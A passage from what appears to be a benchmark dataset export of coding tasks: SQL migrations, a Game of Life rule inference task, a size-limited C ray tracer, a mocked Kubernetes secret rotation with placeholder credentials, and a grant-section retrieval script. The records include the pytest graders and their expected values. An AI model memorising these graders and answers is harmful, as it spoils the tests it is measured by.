    assert 'orders' in tables, ""orders table not found""","{""test_migrations_execute_successfully"": 0.6, ""test_database_schema_created"": 0.4}","{""002_create_products_table.sql"": ""-- Create products table\nCREATE TABLE products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(255) NOT NULL,\n    description TEXT,\n    price DECIMAL(10, 2) NOT NULL,\n    stock_quantity INTEGER DEFAULT 0,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);"", ""003_create_orders_table.sql"": ""-- Create orders table with foreign key\nCREATE TABLE orders (\n    id SERIAL PRIMARY KEY,\n    user_id INTEGER NOT NULL,\n    total_amount DECIMAL(10, 2) NOT NULL,\n    status VARCHAR(50) DEFAULT 'pending',\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    FOREIGN KEY (user_id) REFERENCES users(id)\n);"", ""001_create_users_table.sql"": ""-- Create users table\nCREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    username VARCHAR(255) NOT NULL UNIQUE,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE INDEX idx_users_email ON users(email);"", ""migrate.py"": ""#!/usr/bin/env python3\nimport os\nimport sys\nimport psycopg2\nfrom pathlib import Path\n\ndef run_migrations():\n    try:\n        conn = psycopg2.connect(\n            host=os.getenv('DB_HOST', 'localhost'),\n            port=os.getenv('DB_PORT', '5432'),\n            database=os.getenv('DB_NAME', 'appdb'),\n            user=os.getenv('DB_USER', 'appuser'),\n            password=os.getenv('DB_PASS', 'apppass')\n        )\n        cur = conn.cursor()\n        \n        migration_dir = Path('/app/migrations')\n        \n        for migration_file in sorted(migration_dir.glob('*.sql')):\n            print(f\""Running migration: {migration_file.name}\"")\n            with open(migration_file, 'r') as f:\n                sql = f.read()\n                cur.execute(sql)\n                conn.commit()\n                print(f\""\u2713 Completed: {migration_file.name}\"")\n        \n        cur.close()\n        conn.close()\n        print(\""\\nAll migrations completed successfully!\"")\n        \n    except Exception as e:\n        print(f\""Migration failed: {str(e)}\"", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == \""__main__\"":\n    run_migrations()""}",2025-07-22T15:13:41.854104+00:00,2025-07-22T15:34:41.506426+00:00
draft_dp_eeaf3333,hard,draft_dp_eeaf3333,scientific-computing,I have some cellular automaton evolution examples in /app/examples/. Figure out the rule and implement next_generation() in automaton.py to correctly evolve any grid.,scientific-computing,python|numpy|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy

COPY automaton.py /app/
RUN mkdir -p /app/examples
COPY example1.json /app/examples/
COPY example2.json /app/examples/
COPY example3.json /app/examples/
COPY example4.json /app/examples/

CMD [""/bin/bash""]","import subprocess
import json
import numpy as np

def test_blinker_oscillator():
    """"""Test that the implementation correctly evolves a blinker pattern.""""""
    result = subprocess.run(['python', '-c', '''
import numpy as np
import json
from automaton import next_generation

# Load blinker example
with open(""/app/examples/example1.json"") as f:
    data = json.load(f)

grid0 = np.array(data[""generations""][0])
grid1 = np.array(data[""generations""][1])

# Apply our implementation
predicted = next_generation(grid0)

# Check if it matches expected
if np.array_equal(predicted, grid1):
    print(""PASS"")
else:
    print(""FAIL"")
'''], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert ""PASS"" in result.stdout

def test_glider_movement():
    """"""Test that the implementation correctly moves a glider pattern.""""""
    result = subprocess.run(['python', '-c', '''
import numpy as np
import json
from automaton import next_generation

# Load glider example
with open(""/app/examples/example3.json"") as f:
    data = json.load(f)

# Test first two transitions
grid0 = np.array(data[""generations""][0])
grid1 = np.array(data[""generations""][1])
grid2 = np.array(data[""generations""][2])

# Apply our implementation
predicted1 = next_generation(grid0)
predicted2 = next_generation(predicted1)

# Check both transitions
if np.array_equal(predicted1, grid1) and np.array_equal(predicted2, grid2):
    print(""PASS"")
else:
    print(""FAIL"")
'''], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert ""PASS"" in result.stdout","{""test_blinker_oscillator"": 0.4, ""test_glider_movement"": 0.6}","{""example1.json"": ""{\n  \""description\"": \""Blinker oscillator\"",\n  \""generations\"": [\n    [[0, 0, 0, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 0, 0, 0]],\n    [[0, 0, 0, 0, 0],\n     [0, 0, 0, 0, 0],\n     [0, 1, 1, 1, 0],\n     [0, 0, 0, 0, 0],\n     [0, 0, 0, 0, 0]],\n    [[0, 0, 0, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 1, 0, 0],\n     [0, 0, 0, 0, 0]]\n  ]\n}"", ""example3.json"": ""{\n  \""description\"": \""Glider\"",\n  \""generations\"": [\n    [[0, 0, 0, 0, 0, 0],\n     [0, 0, 0, 1, 0, 0],\n     [0, 1, 0, 1, 0, 0],\n     [0, 0, 1, 1, 0, 0],\n     [0, 0, 0, 0, 0, 0],\n     [0, 0, 0, 0, 0, 0]],\n    [[0, 0, 0, 0, 0, 0],\n     [0, 0, 1, 0, 0, 0],\n     [0, 0, 0, 1, 1, 0],\n     [0, 0, 1, 1, 0, 0],\n     [0, 0, 0, 0, 0, 0],\n     [0, 0, 0, 0, 0, 0]],\n    [[0, 0, 0, 0, 0, 0],\n     [0, 0, 0, 1, 0, 0],\n     [0, 0, 0, 0, 1, 0],\n     [0, 0, 1, 1, 1, 0],\n     [0, 0, 0, 0, 0, 0],\n     [0, 0, 0, 0, 0, 0]]\n  ]\n}"", ""example2.json"": ""{\n  \""description\"": \""Block still life\"",\n  \""generations\"": [\n    [[0, 0, 0, 0],\n     [0, 1, 1, 0],\n     [0, 1, 1, 0],\n     [0, 0, 0, 0]],\n    [[0, 0, 0, 0],\n     [0, 1, 1, 0],\n     [0, 1, 1, 0],\n     [0, 0, 0, 0]],\n    [[0, 0, 0, 0],\n     [0, 1, 1, 0],\n     [0, 1, 1, 0],\n     [0, 0, 0, 0]]\n  ]\n}"", ""automaton.py"": ""import numpy as np\n\ndef next_generation(grid):\n    \""\""\""\n    Apply cellular automaton rules to produce the next generation.\n    \n    Args:\n        grid: 2D numpy array where 1 represents alive cells and 0 represents dead cells\n        \n    Returns:\n        2D numpy array representing the next generation\n    \""\""\""\n    # TODO: Implement the cellular automaton rules based on the examples\n    pass"", ""example4.json"": ""{\n  \""description\"": \""Death and birth patterns\"",\n  \""generations\"": [\n    [[0, 0, 0, 0, 0],\n     [0, 1, 1, 1, 0],\n     [0, 1, 1, 1, 0],\n     [0, 1, 1, 1, 0],\n     [0, 0, 0, 0, 0]],\n    [[0, 0, 1, 0, 0],\n     [0, 1, 0, 1, 0],\n     [1, 0, 0, 0, 1],\n     [0, 1, 0, 1, 0],\n     [0, 0, 1, 0, 0]],\n    [[0, 0, 1, 0, 0],\n     [0, 1, 0, 1, 0],\n     [1, 0, 0, 0, 1],\n     [0, 1, 0, 1, 0],\n     [0, 0, 1, 0, 0]]\n  ]\n}""}",2025-07-22T17:55:27.759112+00:00,2025-07-22T17:55:27.832661+00:00
draft_dp_ffa1a907,hard,draft_dp_ffa1a907,software-engineering,Need a tiny ray tracer that renders spheres with basic lighting. Must compile to under 2.5KB binary and output a 64x64 PPM image.,software-engineering,C|optimization|images,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /workspace

# Install necessary build tools
RUN apt-get update && apt-get install -y \
    build-essential \
    binutils \
    file \
    imagemagick \
    && rm -rf /var/lib/apt/lists/*

# Copy starter code
COPY Makefile /workspace/
COPY scene.h /workspace/

# Set up the environment
RUN touch raytracer.c","import os
import subprocess

def test_binary_size_under_limit():
    """"""Test that the compiled raytracer binary is under 2.5KB.""""""
    # Check if binary exists
    assert os.path.exists('/workspace/raytracer'), ""raytracer binary not found""
    
    # Get file size
    size = os.path.getsize('/workspace/raytracer')
    assert size <= 2560, f""Binary size {size} bytes exceeds 2.5KB (2560 bytes) limit""

def test_raytracer_produces_valid_image():
    """"""Test that the raytracer produces a valid PPM image with correct dimensions.""""""
    # Run the raytracer
    result = subprocess.run(['/workspace/raytracer'], 
                          capture_output=True, text=True, cwd='/workspace')
    assert result.returncode == 0, f""Raytracer failed with return code {result.returncode}""
    
    # Check if output.ppm was created
    assert os.path.exists('/workspace/output.ppm'), ""output.ppm not created""
    
    # Verify PPM format and dimensions
    with open('/workspace/output.ppm', 'r') as f:
        # Read PPM header
        magic = f.readline().strip()
        assert magic == 'P3', f""Invalid PPM magic number: {magic}""
        
        # Skip comments
        line = f.readline()
        while line.startswith('#'):
            line = f.readline()
        
        # Parse dimensions
        width, height = map(int, line.strip().split())
        assert width == 64 and height == 64, f""Invalid image dimensions: {width}x{height}, expected 64x64""
        
        # Check max color value
        max_val = int(f.readline().strip())
        assert max_val == 255, f""Invalid max color value: {max_val}""
        
        # Verify we have pixel data (at least some non-zero values)
        pixel_data = f.read()
        pixels = list(map(int, pixel_data.split()))
        assert len(pixels) == 64 * 64 * 3, f""Invalid pixel count: {len(pixels)}, expected {64*64*3}""
        assert any(p > 0 for p in pixels), ""Image is completely black""","{""test_binary_size_under_limit"": 0.3, ""test_raytracer_produces_valid_image"": 0.7}","{""Makefile"": ""CC = gcc\nCFLAGS = -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -fno-stack-protector\nLDFLAGS = -Wl,--gc-sections -Wl,-z,norelro -Wl,--build-id=none\n\n.PHONY: all clean check\n\nall: raytracer\n\nraytracer: raytracer.c\n\t$(CC) $(CFLAGS) -o raytracer raytracer.c $(LDFLAGS)\n\tstrip --strip-all raytracer\n\t@echo \""Binary size: $$(stat -c%s raytracer) bytes\""\n\ncheck: raytracer\n\t@SIZE=$$(stat -c%s raytracer); \\\n\tif [ $$SIZE -gt 2560 ]; then \\\n\t\techo \""ERROR: Binary size $$SIZE exceeds 2.5KB limit!\""; \\\n\t\texit 1; \\\n\telse \\\n\t\techo \""OK: Binary size $$SIZE is within 2.5KB limit\""; \\\n\tfi\n\nclean:\n\trm -f raytracer output.ppm"", ""scene.h"": ""#ifndef SCENE_H\n#define SCENE_H\n\n// Scene configuration\n#define IMAGE_WIDTH 64\n#define IMAGE_HEIGHT 64\n\n// Scene objects - 3 spheres\n#define NUM_SPHERES 3\n\n// Sphere data: x, y, z, radius\nstatic const float spheres[NUM_SPHERES][4] = {\n    {0.0f, 0.0f, -3.0f, 0.8f},    // Center sphere\n    {-1.5f, 0.0f, -3.5f, 0.5f},   // Left sphere  \n    {1.2f, -0.3f, -2.5f, 0.4f}    // Right sphere\n};\n\n// Light position\nstatic const float light[3] = {2.0f, 3.0f, -1.0f};\n\n#endif""}",2025-07-22T17:49:28.016125+00:00,2025-07-22T17:50:05.036388+00:00
draft_dp_205fcf6b,hard,draft_dp_205fcf6b,security,Need to rotate the production secrets in Kubernetes from /secure/new-secrets.yaml. Make sure to backup the old secrets encrypted to /backup/secrets-archive/ and don't let any secret values show up in logs or command history. Create an audit log at /audit/rotation.log.,security,encryption|sys-admin|automation,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install dependencies
RUN apt-get update && \
    apt-get install -y \
    curl \
    wget \
    openssl \
    python3 \
    python3-pip \
    python3-yaml \
    python3-pytest \
    jq \
    && rm -rf /var/lib/apt/lists/*

# Python yaml module is already installed via python3-yaml

# Create necessary directories
RUN mkdir -p /secure /backup/secrets-archive /audit /kube/secrets /kube/pods

# Copy setup files
COPY mock-kubectl.sh /usr/local/bin/kubectl
COPY current-secrets.yaml /kube/secrets/prod-app-secrets.yaml
COPY new-secrets.yaml /secure/
COPY init-mock-env.sh /tmp/

# Make scripts executable
RUN chmod +x /usr/local/bin/kubectl /tmp/init-mock-env.sh

# Initialize mock environment
RUN /tmp/init-mock-env.sh

# Setup work directory
WORKDIR /workspace","import subprocess
import os
import hashlib
import json
import yaml

def test_secrets_rotated():
    """"""Test that the secrets have been updated with new values""""""
    # Get current secret values
    result = subprocess.run(
        ['kubectl', 'get', 'secret', 'prod-app-secrets', '-n', 'production', '-o', 'yaml'],
        capture_output=True, text=True
    )
    assert result.returncode == 0, ""Failed to get secrets""
    
    secret_data = yaml.safe_load(result.stdout)
    
    # Expected new values (base64 encoded)
    expected_values = {
        'database-password': 'bmV3UGFzc3dvcmQ0NTY=',
        'api-key': 'eHl6MTIzNDU2Nzg5',
        'jwt-secret': 'bmV3U2VjcmV0S2V5Nzg5'
    }
    
    # Verify all secrets have been updated
    for key, expected_value in expected_values.items():
        assert key in secret_data['data'], f""Missing key: {key}""
        assert secret_data['data'][key] == expected_value, f""Secret {key} not updated correctly""

def test_backup_created_and_encrypted():
    """"""Test that backup files exist and are encrypted""""""
    backup_dir = '/backup/secrets-archive'
    assert os.path.exists(backup_dir), ""Backup directory does not exist""
    
    # Check for backup files
    backup_files = os.listdir(backup_dir)
    assert len(backup_files) > 0, ""No backup files created""
    
    # Verify files are encrypted (not plain YAML)
    for backup_file in backup_files:
        file_path = os.path.join(backup_dir, backup_file)
        with open(file_path, 'rb') as f:
            content = f.read()
            
        # Check that content is not plain YAML
        try:
            # If we can parse it as YAML, it's not encrypted
            yaml.safe_load(content)
            assert False, f""Backup file {backup_file} is not encrypted""
        except:
            # Good - file cannot be parsed as YAML, likely encrypted
            pass

def test_audit_log_created():
    """"""Test that rotation audit log exists with proper entries""""""
    audit_log = '/audit/rotation.log'
    assert os.path.exists(audit_log), ""Audit log does not exist""
    
    with open(audit_log, 'r') as f:
        log_content = f.read()
    
    # Verify log has content
    assert len(log_content) > 0, ""Audit log is empty""
    
    # Verify no actual secret values in log
    forbidden_values = [
        'oldPassword123', 'newPassword456',
        'abcdefghijk', 'xyz123456789',
        'secretKey12345', 'newSecretKey789'
    ]
    
    for value in forbidden_values:
        assert value not in log_content, f""Secret value '{value}' found in audit log""","{""test_secrets_rotated"": 0.4, ""test_backup_created_and_encrypted"": 0.3, ""test_audit_log_created"": 0.3}","{""init-mock-env.sh"": ""#!/bin/bash\n\n# Initialize mock Kubernetes environment\n\nKUBE_DIR=\""/kube\""\nPODS_DIR=\""$KUBE_DIR/pods\""\n\n# Create mock pods\nfor i in 1 2; do\n    pod_name=\""production-app-7d8b9c6f5-$(openssl rand -hex 3)\""\n    mkdir -p \""$PODS_DIR/$pod_name\""\n    echo \""45m\"" > \""$PODS_DIR/$pod_name/age\""\ndone\n\n# Create kubectl history file\ntouch \""$KUBE_DIR/.kubectl_history\""\n\necho \""Mock Kubernetes environment initialized\"""", ""current-secrets.yaml"": ""apiVersion: v1\nkind: Secret\nmetadata:\n  name: prod-app-secrets\n  namespace: production\ntype: Opaque\ndata:\n  database-password: b2xkUGFzc3dvcmQxMjM=\n  api-key: YWJjZGVmZ2hpams=\n  jwt-secret: c2VjcmV0S2V5MTIzNDU="", ""mock-kubectl.sh"": ""#!/bin/bash\n\n# Mock kubectl to simulate Kubernetes operations for testing\n\nKUBE_DIR=\""/kube\""\nSECRETS_DIR=\""$KUBE_DIR/secrets\""\nPODS_DIR=\""$KUBE_DIR/pods\""\nHISTORY_FILE=\""$KUBE_DIR/.kubectl_history\""\n\n# Log command to history (but not secret values)\necho \""kubectl $@\"" >> $HISTORY_FILE\n\ncase \""$1\"" in\n    \""get\"")\n        if [[ \""$2\"" == \""secret\"" && \""$3\"" == \""prod-app-secrets\"" ]]; then\n            if [[ \""$5\"" == \""production\"" && \""$7\"" == \""yaml\"" ]]; then\n                cat \""$SECRETS_DIR/prod-app-secrets.yaml\""\n            fi\n        elif [[ \""$2\"" == \""pods\"" && \""$4\"" == \""production\"" ]]; then\n            # Simulate pod listing\n            echo \""NAME                              READY   STATUS    RESTARTS   AGE\""\n            for pod in $(ls $PODS_DIR 2>/dev/null | grep -E '^production-app-'); do\n                age=$(cat \""$PODS_DIR/$pod/age\"" 2>/dev/null || echo \""10m\"")\n                echo \""$pod   1/1     Running   0          $age\""\n            done\n        fi\n        ;;\n    \""apply\"")\n        if [[ \""$2\"" == \""-f\"" && \""$3\"" == \""-\"" ]]; then\n            # Read from stdin and save to appropriate location\n            content=$(cat)\n            if echo \""$content\"" | grep -q \""kind: Secret\""; then\n                # Save secret (simulating apply)\n                echo \""$content\"" > \""$SECRETS_DIR/prod-app-secrets.yaml\""\n                echo \""secret/prod-app-secrets configured\""\n            fi\n        fi\n        ;;\n    \""rollout\"")\n        if [[ \""$2\"" == \""restart\"" && \""$3\"" == \""deployment/production-app\"" ]]; then\n            # Simulate pod restart by updating ages\n            for pod in $(ls $PODS_DIR 2>/dev/null | grep -E '^production-app-'); do\n                echo \""1s\"" > \""$PODS_DIR/$pod/age\""\n            done\n            echo \""deployment.apps/production-app restarted\""\n        fi\n        ;;\n    \""logs\"")\n        # Return empty logs (no secrets should be in logs)\n        echo \""2024-01-15 10:00:00 INFO Application started\""\n        echo \""2024-01-15 10:00:01 INFO Connected to database\""\n        echo \""2024-01-15 10:00:02 INFO Server listening on port 80\""\n        ;;\n    *)\n        echo \""kubectl mock: command not implemented\""\n        exit 1\n        ;;\nesac"", ""new-secrets.yaml"": ""apiVersion: v1\nkind: Secret\nmetadata:\n  name: prod-app-secrets\n  namespace: production\ntype: Opaque\ndata:\n  database-password: bmV3UGFzc3dvcmQ0NTY=\n  api-key: eHl6MTIzNDU2Nzg5\n  jwt-secret: bmV3U2VjcmV0S2V5Nzg5""}",2025-07-22T11:58:32.450346+00:00,2025-07-22T20:35:08.680218+00:00
draft_dp_f651c60c,extremely_hard,draft_dp_f651c60c,data-processing,The grant deadline is tomorrow. Need a script to extract relevant sections from our research papers and map them to the NSF grant template. Must handle multiple PDFs and show confidence scores for each mapping.,data-processing,python|information-retrieval|text-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install Python packages
RUN pip install --no-cache-dir \
    pypdf2==3.0.1 \
    reportlab==4.0.8 \
    beautifulsoup4==4.12.2 \
    nltk==3.8.1

# Download NLTK data
RUN python -c ""import nltk; nltk.download('punkt'); nltk.download('stopwords')""

# Copy application files
COPY nsf_grant_template.json /app/
COPY grant_rag.py /app/
COPY create_papers.py /app/

# Generate sample research papers
RUN python create_papers.py

# Make the main script executable
RUN chmod +x grant_rag.py

CMD [""/bin/bash""]","import json
import os

def test_grant_sections_populated():
    """"""Test that all grant sections are populated with content from papers.""""""
    # Check if the output file exists
    assert os.path.exists('/app/grant_output.json'), ""Grant output file not found""
    
    with open('/app/grant_output.json', 'r') as f:
        grant_data = json.load(f)
    
    # Required sections in NSF grant
    required_sections = [
        'project_summary',
        'intellectual_merit', 
        'broader_impacts',
        'research_plan',
        'prior_results'
    ]
    
    # Check each section has content
    for section in required_sections:
        assert section in grant_data, f""Missing section: {section}""
        assert grant_data[section].get('content'), f""Section {section} has no content""
        assert len(grant_data[section]['content']) > 50, f""Section {section} content too short""

def test_confidence_scores_present():
    """"""Test that each mapping includes confidence scores.""""""
    assert os.path.exists('/app/grant_output.json'), ""Grant output file not found""
    
    with open('/app/grant_output.json', 'r') as f:
        grant_data = json.load(f)
    
    # Check confidence scores for each section
    for section, data in grant_data.items():
        assert 'confidence' in data, f""No confidence score for section: {section}""
        confidence = data['confidence']
        assert isinstance(confidence, (int, float)), f""Confidence score not numeric for {section}""
        assert 0 <= confidence <= 1, f""Confidence score out of range for {section}: {confidence}""","{""test_grant_sections_populated"": 0.7, ""test_confidence_scores_present"": 0.3}","{""grant_rag.py"": ""#!/usr/bin/env python3\n\""\""\""\nRAG system for grant application auto-fill from research papers\n\""\""\""\nimport json\nimport os\nfrom typing import Dict, List, Tuple\nimport PyPDF2\nfrom collections import Counter\nimport re\nimport math\nimport nltk\nfrom nltk.corpus import stopwords\nfrom nltk.tokenize import word_tokenize\n\n# Download required NLTK data\ntry:\n    nltk.data.find('tokenizers/punkt')\nexcept LookupError:\n    nltk.download('punkt')\ntry:\n    nltk.data.find('corpora/stopwords')\nexcept LookupError:\n    nltk.download('stopwords')\n\ndef extract_text_from_pdf(pdf_path: str) -> str:\n    \""\""\""Extract text content from a PDF file.\""\""\""\n    text = \""\""\n    with open(pdf_path, 'rb') as file:\n        pdf_reader = PyPDF2.PdfReader(file)\n        for page in pdf_reader.pages:\n            text += page.extract_text() + \""\\n\""\n    return text\n\ndef load_papers(papers_dir: str) -> Dict[str, str]:\n    \""\""\""Load all PDF papers from directory.\""\""\""\n    papers = {}\n    for filename in os.listdir(papers_dir):\n        if filename.endswith('.pdf'):\n            path = os.path.join(papers_dir, filename)\n            papers[filename] = extract_text_from_pdf(path)\n    return papers\n\ndef preprocess_text(text: str) -> str:\n    \""\""\""Basic text preprocessing.\""\""\""\n    # Remove extra whitespace\n    text = ' '.join(text.split())\n    return text.lower()\n\ndef create_paper_chunks(papers: Dict[str, str], chunk_size: int = 300) -> List[Tuple[str, str, str]]:\n    \""\""\""Split papers into chunks for better matching.\""\""\""\n    chunks = []\n    for paper_name, content in papers.items():\n        # Clean the content\n        clean_content = preprocess_text(content)\n        words = clean_content.split()\n        \n        # Also keep original for display\n        original_words = content.split()\n        \n        for i in range(0, len(words), chunk_size // 2):  # Overlap chunks\n            chunk = ' '.join(words[i:i + chunk_size])\n            original_chunk = ' '.join(original_words[i:i + chunk_size])\n            if len(chunk) > 50:  # Skip very small chunks\n                chunks.append((paper_name, chunk, original_chunk))\n    return chunks\n\ndef compute_tfidf(documents: List[str]) -> Tuple[Dict[str, float], Dict[str, Dict[str, float]]]:\n    \""\""\""Compute TF-IDF scores for documents.\""\""\""\n    stop_words = set(stopwords.words('english'))\n    \n    # Document frequency\n    df = Counter()\n    doc_tfs = []\n    \n    for doc in documents:\n        words = [w for w in word_tokenize(doc.lower()) if w.isalnum() and w not in stop_words]\n        word_set = set(words)\n        for word in word_set:\n            df[word] += 1\n        \n        # Term frequency for this doc\n        tf = Counter(words)\n        total_words = len(words)\n        tf_norm = {word: count / total_words for word, count in tf.items()}\n        doc_tfs.append(tf_norm)\n    \n    # IDF scores\n    num_docs = len(documents)\n    idf = {word: math.log(num_docs / freq) for word, freq in df.items()}\n    \n    # TF-IDF for each document\n    tfidf_scores = []\n    for tf in doc_tfs:\n        tfidf = {word: tf_val * idf.get(word, 0) for word, tf_val in tf.items()}\n        tfidf_scores.append(tfidf)\n    \n    return idf, tfidf_scores\n\ndef cosine_similarity(vec1: Dict[str, float], vec2: Dict[str, float]) -> float:\n    \""\""\""Calculate cosine similarity between two TF-IDF vectors.\""\""\""\n    common_words = set(vec1.keys()) & set(vec2.keys())\n    \n    if not common_words:\n        return 0.0\n    \n    dot_product = sum(vec1[word] * vec2[word] for word in common_words)\n    \n    norm1 = math.sqrt(sum(val ** 2 for val in vec1.values()))\n    norm2 = math.sqrt(sum(val ** 2 for val in vec2.values()))\n    \n    if norm1 == 0 or norm2 == 0:\n        return 0.0\n    \n    return dot_product / (norm1 * norm2)\n\ndef find_best_matches(section_keywords: Dict[str, List[str]], chunks: List[Tuple[str, str, str]], \n                     chunk_tfidf: List[Dict[str, float]], idf: Dict[str, float]) -> Dict[str, Tuple[str, float]]:\n    \""\""\""Find best matching chunks for each grant section.\""\""\""\n    matches = {}\n    \n    for section, keywords in section_keywords.items():\n        # Create query vector from keywords\n        query = ' '.join(keywords)\n        query_words = [w for w in word_tokenize(query.lower()) if w.isalnum()]\n        query_tf = Counter(query_words)\n        total_words = len(query_words)\n        query_tfidf = {word: (count / total_words) * idf.get(word, 0) \n                      for word, count in query_tf.items()}\n        \n        # Find best matching chunk\n        best_score = 0\n        best_chunk = None\n        \n        for i, (paper, chunk, original) in enumerate(chunks):\n            score = cosine_similarity(query_tfidf, chunk_tfidf[i])\n            if score > best_score:\n                best_score = score\n                best_chunk = (original, score, paper)\n        \n        if best_chunk:\n            matches[section] = best_chunk\n    \n    return matches\n\ndef generate_grant_content(template: Dict, matches: Dict[str, Tuple[str, float]]) -> Dict:\n    \""\""\""Generate grant content with matched sections and confidence scores.\""\""\""\n    grant_output = {}\n    \n    for section, config in template.items():\n        if section in matches:\n            content, confidence, source = matches[section]\n            # Trim to max length if needed\n            max_chars = config.get('max_chars', 5000)\n            if len(content) > max_chars:\n                content = content[:max_chars - 100] + \""...\""\n            \n            grant_output[section] = {\n                'content': content,\n                'confidence': round(confidence, 3),\n                'source': source,\n                'instructions': config['instructions']\n            }\n        else:\n            # Fallback for unmatched sections\n            grant_output[section] = {\n                'content': f\""[No matching content found for {section}]\"",\n                'confidence': 0.0,\n                'source': 'none',\n                'instructions': config['instructions']\n            }\n    \n    return grant_output\n\ndef main():\n    # Load grant template\n    with open('nsf_grant_template.json', 'r') as f:\n        template = json.load(f)\n    \n    # Load research papers\n    papers = load_papers('papers/')\n    print(f\""Loaded {len(papers)} research papers\"")\n    \n    # Create chunks from papers\n    chunks = create_paper_chunks(papers)\n    print(f\""Created {len(chunks)} text chunks\"")\n    \n    # Extract just the text for TF-IDF\n    chunk_texts = [chunk[1] for chunk in chunks]\n    \n    # Compute TF-IDF\n    print(\""Computing TF-IDF scores...\"")\n    idf, chunk_tfidf = compute_tfidf(chunk_texts)\n    \n    # Define keywords for each grant section\n    section_keywords = {\n        'project_summary': ['project', 'research', 'objective', 'method', 'approach', 'goal', \n                           'innovation', 'summary', 'overview', 'propose'],\n        'intellectual_merit': ['advance', 'knowledge', 'understanding', 'contribution', \n                              'novel', 'innovation', 'research', 'field', 'science'],\n        'broader_impacts': ['society', 'benefit', 'education', 'diversity', 'community', \n                           'training', 'outreach', 'public', 'broader', 'impact'],\n        'research_plan': ['methodology', 'experiment', 'analysis', 'timeline', 'plan',\n                         'approach', 'technique', 'procedure', 'design', 'implementation'],\n        'prior_results': ['previous', 'prior', 'result', 'finding', 'outcome', \n                         'publication', 'achievement', 'success', 'demonstrated']\n    }\n    \n    # Find best matches\n    print(\""Matching content to grant sections...\"")\n    matches = find_best_matches(section_keywords, chunks, chunk_tfidf, idf)\n    \n    # Generate grant content\n    grant_data = generate_grant_content(template, matches)\n    \n    # Save output\n    with open('/app/grant_output.json', 'w') as f:\n        json.dump(grant_data, f, indent=2)\n    \n    print(\""Grant application draft saved to grant_output.json\"")\n    print(\""\\nSection mappings:\"")\n    for section, data in grant_data.items():\n        print(f\""  {section}: confidence={data['confidence']:.2f}, source={data['source']}\"")\n    \nif __name__ == \""__main__\"":\n    main()"", ""create_papers.py"": ""#!/usr/bin/env python3\n\""\""\""Generate sample research papers as PDFs\""\""\""\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, PageBreak\nfrom reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle\nfrom reportlab.lib.units import inch\nimport os\n\npapers = {\n    \""transformer_optimization.pdf\"": {\n        \""title\"": \""Efficient Training of Large-Scale Transformers through Dynamic Batch Scheduling\"",\n        \""authors\"": \""Smith, J., Chen, L., Kumar, R.\"",\n        \""abstract\"": \""We present a novel approach to training large-scale transformer models that reduces computational requirements by 40% through dynamic batch scheduling. Our method adaptively adjusts batch sizes based on gradient variance, enabling more efficient use of GPU memory while maintaining model performance.\"",\n        \""content\"": \""\""\""\n        Introduction: Large-scale transformer models have revolutionized natural language processing but require enormous computational resources. Training GPT-3 scale models can cost millions of dollars and produce significant carbon emissions. We address this challenge through dynamic batch scheduling that optimizes resource utilization.\n        \n        Methodology: Our approach monitors gradient variance during training and dynamically adjusts batch sizes. When gradients are stable, we increase batch size to improve throughput. During unstable periods, we reduce batch size to maintain training stability. We implement this through a custom PyTorch scheduler that interfaces with distributed training frameworks.\n        \n        Results: Experiments on models ranging from 1B to 13B parameters show consistent 35-40% reduction in training time. We maintain identical perplexity scores compared to baseline fixed-batch training. Memory efficiency improves by 25% on average, allowing larger models to fit on existing hardware.\n        \n        Impact: This work enables academic institutions and smaller companies to train large language models with limited resources. The reduced energy consumption aligns with sustainable AI practices. We estimate potential savings of $2M per large model training run.\n        \n        Prior Work: We build upon gradient accumulation techniques (Chen et al., 2021) and adaptive learning rates (Liu et al., 2020). Our innovation lies in the dynamic scheduling algorithm that responds to training dynamics in real-time.\n        \""\""\""\n    },\n    \n    \""neural_architecture_search.pdf\"": {\n        \""title\"": \""AutoML for Edge Devices: Neural Architecture Search with Hardware Constraints\"",\n        \""authors\"": \""Johnson, A., Patel, S., Williams, K.\"",\n        \""abstract\"": \""We introduce HardwareNAS, a neural architecture search framework that jointly optimizes for accuracy and hardware efficiency on edge devices. Our method discovers architectures that are 10x smaller while maintaining 95% of baseline accuracy.\"",\n        \""content\"": \""\""\""\n        Introduction: Deploying deep learning models on edge devices remains challenging due to memory and computational constraints. Existing neural architecture search (NAS) methods optimize primarily for accuracy, producing models unsuitable for resource-constrained environments.\n        \n        Methodology: HardwareNAS incorporates hardware profiling directly into the search process. We model latency, memory usage, and power consumption for target devices. The search algorithm uses multi-objective optimization to balance accuracy against hardware metrics. We employ weight sharing and early stopping to reduce search costs.\n        \n        Results: On ImageNet classification, HardwareNAS discovers models with 2M parameters achieving 72% top-1 accuracy, compared to MobileNetV3's 75% with 5M parameters. Latency on Raspberry Pi 4 improves by 3x. Power consumption reduces by 60% enabling battery-powered deployment.\n        \n        Broader Impacts: This technology democratizes AI by enabling deployment on inexpensive hardware. Applications include medical diagnosis in rural areas, wildlife monitoring, and assistive technologies for disabled individuals. The reduced energy footprint supports sustainable AI deployment.\n        \n        Related Research: We extend differentiable NAS (Liu et al., 2019) with hardware-aware objectives. Unlike previous hardware-aware methods (Wu et al., 2019), we directly profile target devices rather than using proxy metrics.\n        \""\""\""\n    },\n    \n    \""federated_learning.pdf\"": {\n        \""title\"": 